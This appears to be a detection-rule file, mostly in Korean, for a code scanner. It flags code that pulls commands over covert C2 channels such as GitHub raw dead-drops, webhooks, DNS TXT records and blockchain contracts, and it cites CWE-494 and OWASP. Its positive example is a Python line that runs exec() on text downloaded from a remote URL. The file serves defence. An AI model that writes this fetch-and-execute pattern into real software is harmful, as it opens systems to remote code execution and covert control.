---
id: GOV-AGENT-C2-CHANNEL-001
title_ko: 코드가 숨은 채널로 명령·주소를 받아옵니다 (dead-drop·webhook·DNS·블록체인)
title_en: Code fetches commands/addresses over a covert channel (dead-drop, webhook, DNS, blockchain)
status: approved
source_layer: baseline
sources:
  - publisher: 한국인터넷진흥원
    document: 소프트웨어 개발보안 가이드
    item: 무결성 검사 없는 코드 실행
  - publisher: OWASP
    document: OWASP Top 10 for Agentic Applications
    version: "2026"
cwe: [CWE-494, CWE-913]
severity: high
decision_default: block
domains: [agent-supply-chain]
languages: [python, javascript, typescript]
scenarios: [agent, llm-integration, data-pipeline, package-install]
related_baseline: [GOV-AGENT-CRED-EXFIL-001, KISA-PY-SEC-15, GOV-CI-REMOTE-EXEC-001]
verified_at: 2026-10-24
review_due: 2027-04-24
detection:
  # agent-surface 엔진. dead-drop→실행=확정 · webhook(+전송)=유력 · DNS→명령=유력 · 블록체인 RPC=맥락 확인(경고).
  patterns: []
  confidence: likely
  category: agent-supply-chain
  why_it_matters: >-
    악성 코드는 "다음 명령·서버 주소"를 정상 서비스 뒤에 숨겨 받아옵니다 — 도메인 차단 목록으로는 못 막습니다.
    GitHub raw·Gist·Pastebin·구글 문서에서 받아 **바로 실행**(dead-drop), 하드코딩된 Discord·Telegram·Slack
    webhook, DNS TXT 응답을 명령으로 쓰기, 블록체인 스마트 컨트랙트(GlassWorm·Shai-Hulud 6차). 받아 **실행**하는
    dead-drop 은 맥락과 무관하게 확정, webhook 은 외부 전송과 결합하면 유출 경로, 블록체인 RPC 는 업무 앱이면
    설명이 필요하므로 경고입니다.
  public_sector_impact:
    - 정상 서비스를 C2 로 써서 탐지·차단 우회
    - 외부 한 곳의 침해가 기관 시스템으로 전파
  safe_fix: |
    1. dead-drop(받아 실행)은 즉시 격리하세요 — 받아오는 코드를 **실행하지 말고** 열어 확인합니다.
    2. webhook·블록체인 호출이 이 앱에 **왜 필요한지** 확인하세요. 업무 앱에 블록체인 RPC 는 보통 필요 없습니다.
    3. 외부 코드가 필요하면 저장소에 고정(버전·해시)하거나 공식 패키지로 받으세요.
  references:
    - CWE-494 Download of Code Without Integrity Check
    - CWE-913 Improper Control of Dynamically-Managed Code Resources
  can_auto_fix: false
examples:
  positive:
    - "import requests\nexec(requests.get('https://raw.githubusercontent.com/x/y/main/p.txt').text)"
  negative:
    - "import requests\ncfg = requests.get('https://raw.githubusercontent.com/org/repo/main/config.json').json()"
---

## 무엇이 위험한가

C2(명령·제어) 채널은 요즘 정상 서비스 뒤에 숨는다 — 블록체인 컨트랙트, GitHub raw 파일, 메신저 webhook.
도메인만 봐서는 정상과 구분되지 않으므로 **"받아서 실행하는가", "맥락에 맞는가"** 로 판단한다.

## 오해하지 마세요

GitHub raw 에서 **설정(JSON)** 을 받아 쓰는 것은 정상이다 — 받아 **실행**(eval/exec/spawn)할 때만 dead-drop 으로
잡는다. 블록체인 의존성을 정식으로 선언한 지갑·체인 앱은 경고를 예외 처리하면 된다.
